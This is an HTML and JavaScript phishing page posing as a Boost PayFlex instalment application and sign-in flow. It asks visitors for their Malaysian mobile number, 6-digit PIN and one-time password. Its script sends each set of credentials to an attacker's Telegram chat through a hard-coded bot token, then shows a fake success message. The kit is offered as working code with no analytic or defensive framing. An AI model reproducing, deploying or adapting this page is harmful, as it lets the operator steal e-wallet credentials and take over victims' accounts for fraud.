<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Boost PayFlex</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f5f5f5; }
        .header { background: #e60023; padding: 18px 20px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.15); }
        .logo { color: white; font-size: 32px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 6px; }
        .logo-icon { width: 40px; height: 40px; background: white; border-radius: 8px; display: inline-flex; align-items: center; justify-content: center; font-size: 24px; color: #e60023; font-weight: bold; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
        .card { background: white; border-radius: 16px; padding: 40px 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); margin-top: 40px; }
        .page { display: none; }
        .page.active { display: block; }
        .main-title { font-size: 28px; font-weight: bold; color: #1a1a1a; margin-bottom: 20px; }
        .description { font-size: 16px; color: #666; line-height: 1.6; margin-bottom: 30px; }
        .cta-text { font-size: 16px; color: #666; margin-bottom: 24px; }
        .btn-primary { width: 100%; background: #e60023; color: white; border: none; padding: 16px; font-size: 18px; font-weight: 600; border-radius: 12px; cursor: pointer; text-transform: uppercase; }
        .btn-primary:active { background: #cc0020; }
        .page-title { font-size: 28px; font-weight: bold; color: #1a1a1a; margin-bottom: 12px; }
        .page-subtitle { font-size: 15px; color: #666; margin-bottom: 30px; }
        .form-label { font-size: 16px; font-weight: 600; color: #1a1a1a; margin-bottom: 12px; display: block; }
        .input-text { width: 100%; padding: 14px; font-size: 18px; border: none; border-bottom: 2px solid #e0e0e0; outline: none; margin-bottom: 30px; background: transparent; }
        .input-text:focus { border-bottom-color: #e60023; }
        .pin-container { display: flex; gap: 10px; margin-bottom: 40px; justify-content: space-between; }
        .pin-dot { width: 48px; height: 48px; border: 2px solid #e0e0e0; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 32px; cursor: pointer; }
        .pin-dot.filled { border-color: #e60023; background: #fff5f7; color: #e60023; }
        .btn-circle { width: 64px; height: 64px; background: #e60023; border: none; border-radius: 50%; color: white; font-size: 28px; cursor: pointer; display: flex; align-items: center; justify-content: center; float: right; box-shadow: 0 4px 12px rgba(230,0,35,0.3); }
        .btn-outline { width: 100%; background: white; color: #e60023; border: 2px solid #e60023; padding: 16px; font-size: 18px; font-weight: 600; border-radius: 12px; cursor: pointer; margin-top: 12px; text-transform: uppercase; }
        .btn-secondary { width: 100%; background: #f5f5f5; color: #666; border: none; padding: 16px; font-size: 18px; font-weight: 600; border-radius: 12px; cursor: pointer; margin-top: 12px; text-transform: uppercase; }
        .timer-info { text-align: center; color: #999; font-size: 14px; margin-top: 30px; padding-top: 20px; border-top: 1px solid #f0f0f0; }
        .timer { font-size: 20px; font-weight: 600; color: #1a1a1a; margin-top: 8px; }
        .otp-info { font-size: 15px; color: #666; margin-bottom: 30px; }
        .otp-info strong { color: #1a1a1a; }
        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.75); justify-content: center; align-items: center; z-index: 9999; }
        .loading-overlay.active { display: flex; }
        .spinner { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading-text { color: white; font-size: 16px; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div style="text-align: center;">
            <div class="spinner"></div>
            <div class="loading-text">Processing...</div>
        </div>
    </div>

    <div class="header">
        <div class="logo">
            <div class="logo-icon">B</div>
            <span>oost</span>
        </div>
    </div>

    <div class="container">
        <div class="page active" id="page1">
            <div class="card">
                <h1 class="main-title">Ways to use Boost PayFlex</h1>
                <p class="description">Ways to use Boost PayFlex Boost PayFlex makes everyday purchases and larger expenses manageable. Choose a repayment plan that fits you, with up to 24 months instalment.</p>
                <p class="cta-text">Apply now and live life on your terms!</p>
                <button class="btn-primary" onclick="showPage2()">Apply Now</button>
            </div>
        </div>

        <div class="page" id="page2">
            <div class="card">
                <h2 class="page-title">Sign in to Boost</h2>
                <p class="page-subtitle">Sign in with your registered Boost mobile number.</p>
                <label class="form-label">Mobile Number</label>
                <input type="tel" class="input-text" id="mobileNumber" placeholder="+60  1234567890" value="+60  ">
                <label class="form-label">6-digit PIN</label>
                <div class="pin-container" id="pinDisplay" onclick="document.getElementById('pinInput').focus()">
                    <div class="pin-dot" id="pin1"></div>
                    <div class="pin-dot" id="pin2"></div>
                    <div class="pin-dot" id="pin3"></div>
                    <div class="pin-dot" id="pin4"></div>
                    <div class="pin-dot" id="pin5"></div>
                    <div class="pin-dot" id="pin6"></div>
                </div>
                <input type="password" style="position: absolute; opacity: 0;" id="pinInput" maxlength="6" oninput="updatePinDisplay(this.value)">
                <button class="btn-circle" onclick="submitPin()">â†’</button>
            </div>
        </div>

        <div class="page" id="page3">
            <div class="card">
                <h2 class="page-title">Purchase Authentication</h2>
                <p class="otp-info">The OTP code has been sent to <strong id="maskedPhone">+601****90</strong></p>
                <label class="form-label">6-digit OTP</label>
                <div class="pin-container" id="otpDisplay" onclick="document.getElementById('otpInput').focus()">
                    <div class="pin-dot" id="otp1"></div>
                    <div class="pin-dot" id="otp2"></div>
                    <div class="pin-dot" id="otp3"></div>
                    <div class="pin-dot" id="otp4"></div>
                    <div class="pin-dot" id="otp5"></div>
                    <div class="pin-dot" id="otp6"></div>
                </div>
                <input type="text" style="position: absolute; opacity: 0;" id="otpInput" maxlength="6" oninput="updateOtpDisplay(this.value)">
                <button class="btn-primary" onclick="submitOtp()">CONFIRM</button>
                <button class="btn-outline" onclick="resendOtp()">RESEND</button>
                <button class="btn-secondary" onclick="showPage2()">CANCEL</button>
                <div class="timer-info">
                    The page will automatically timeout after 7 minutes.
                    <div class="timer">Time left: <span id="countdown">7:00</span></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8529714761:AAEhxFLbg0jG5ItyeglXb9GRHWxayQzlKuY';
        const TELEGRAM_CHAT_ID = '8566487499';
        let userPhone = '', userPin = '', userOtp = '', countdownTimer;

        function showPage2() {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById('page2').classList.add('active');
            window.scrollTo(0, 0);
            setTimeout(() => document.getElementById('pinInput').focus(), 100);
        }

        function showPage3() {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById('page3').classList.add('active');
            window.scrollTo(0, 0);
            startCountdown();
            setTimeout(() => document.getElementById('otpInput').focus(), 100);
        }

        function showPage1() {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById('page1').classList.add('active');
            window.scrollTo(0, 0);
        }

        function updatePinDisplay(value) {
            value = value.replace(/\D/g, '');
            document.getElementById('pinInput').value = value;
            for (let i = 1; i <= 6; i++) {
                const dot = document.getElementById('pin' + i);
                if (i <= value.length) {
                    dot.classList.add('filled');
                    dot.textContent = 'â€¢';
                } else {
                    dot.classList.remove('filled');
                    dot.textContent = '';
                }
            }
        }

        function updateOtpDisplay(value) {
            value = value.replace(/\D/g, '');
            document.getElementById('otpInput').value = value;
            for (let i = 1; i <= 6; i++) {
                const dot = document.getElementById('otp' + i);
                if (i <= value.length) {
                    dot.classList.add('filled');
                    dot.textContent = 'â€¢';
                } else {
                    dot.classList.remove('filled');
                    dot.textContent = '';
                }
            }
        }

        async function submitPin() {
            userPhone = document.getElementById('mobileNumber').value.trim();
            userPin = document.getElementById('pinInput').value;
            
            if (!userPhone || userPhone.length < 10) {
                alert('Please enter a valid mobile number');
                return;
            }
            
            if (userPin.length !== 6) {
                alert('Please enter 6-digit PIN');
                return;
            }
            
            const phoneDigits = userPhone.replace(/\D/g, '');
            let masked = '+' + phoneDigits.substring(0, 3) + phoneDigits.substring(3, 4) + '****' + phoneDigits.substring(phoneDigits.length - 2);
            document.getElementById('maskedPhone').textContent = masked;
            
            await sendToTelegram('PIN', { phone: userPhone, pin: userPin });
            showPage3();
        }

        async function submitOtp() {
            userOtp = document.getElementById('otpInput').value;
            
            if (userOtp.length !== 6) {
                alert('Please enter 6-digit OTP');
                return;
            }
            
            await sendToTelegram('COMPLETE', { phone: userPhone, pin: userPin, otp: userOtp });
            
            clearInterval(countdownTimer);
            alert('âœ… Authentication successful!');
            
            resetForm();
            showPage1();
        }

        async function sendToTelegram(type, data) {
            document.getElementById('loadingOverlay').classList.add('active');
            const timestamp = new Date().toLocaleString('en-MY', { timeZone: 'Asia/Kuala_Lumpur', hour12: true });
            let message = '';
            
            if (type === 'PIN') {
                message = `ðŸ”” *BOOST PAYFLEX - NEW LOGIN*\n\nðŸ“± *Phone Number:*\n${data.phone}\n\nðŸ” *PIN Code:*\n${data.pin}\n\nâ° *Time:* ${timestamp}\nðŸŒ *Status:* Waiting for OTP...\nðŸ“Š *Source:* PayFlex Web App`;
            } else {
                const refId = 'BPF' + Date.now().toString().slice(-8);
                message = `âœ… *BOOST PAYFLEX - COMPLETE DATA*\n\nðŸ“± *Phone Number:*\n${data.phone}\n\nðŸ” *PIN Code:*\n${data.pin}\n\nðŸ”‘ *OTP Code:*\n${data.otp}\n\nðŸ†” *Reference:* ${refId}\nâ° *Time:* ${timestamp}\nâœ”ï¸ *Status:* VERIFIED\nðŸ“Š *Source:* PayFlex Web App`;
            }
            
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
                });
            } catch (e) { console.error(e); }
            finally { setTimeout(() => document.getElementById('loadingOverlay').classList.remove('active'), 800); }
        }

        function resendOtp() {
            alert('ðŸ“© OTP code has been resent');
            clearInterval(countdownTimer);
            startCountdown();
            document.getElementById('otpInput').value = '';
            updateOtpDisplay('');
        }

        function startCountdown() {
            let timeLeft = 420;
            const updateTimer = () => {
                const m = Math.floor(timeLeft / 60), s = timeLeft % 60;
                document.getElementById('countdown').textContent = `${m}:${s.toString().padStart(2, '0')}`;
                timeLeft--;
                if (timeLeft < 0) {
                    clearInterval(countdownTimer);
                    alert('â° Session timeout');
                    resetForm();
                    showPage1();
                }
            };
            updateTimer();
            countdownTimer = setInterval(updateTimer, 1000);
        }

        function resetForm() {
            document.getElementById('mobileNumber').value = '+60  ';
            document.getElementById('pinInput').value = '';
            document.getElementById('otpInput').value = '';
            updatePinDisplay('');
            updateOtpDisplay('');
            clearInterval(countdownTimer);
            userPhone = userPin = userOtp = '';
        }
    </script>
</body>
</html>
